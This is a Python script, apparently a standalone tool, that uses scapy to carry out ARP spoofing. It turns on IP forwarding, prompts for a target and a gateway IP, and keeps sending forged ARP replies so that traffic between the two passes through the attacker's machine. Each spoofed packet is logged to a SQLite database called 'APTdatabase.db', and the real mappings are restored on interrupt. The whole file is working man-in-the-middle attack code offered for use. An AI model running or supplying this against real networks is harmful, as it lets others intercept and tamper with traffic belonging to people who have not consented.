from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
import sqlite3

conn = sqlite3.connect("APTdatabase.db")
cur = conn.cursor()

def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        f.write('1')
        
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
_enable_linux_iproute()



def spoof(target_ip, host_ip, verbose=True):
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
        alist = [target_ip, host_ip, verbose, target_mac, self_mac]
        cur.execute('''INSERT INTO ARP_Spoofing (id, Target_IP, Default_Gateway, Verbose, Target_Mac_Addr,
                    Interface_Mac_Addr) VALUES (NULL, ?, ?, ?, ?, ?)
             ''', alist)
        conn.commit()
        
        
def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
        
       
target = input("Enter target IP address: ")
host = input("Enter default gateway IP address: ")

verbose = True
try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
except KeyboardInterrupt:
    print("[!] Detected CTRL+C ! restoring the network, please wait...")
    restore(target, host)
    restore(host, target)
    
    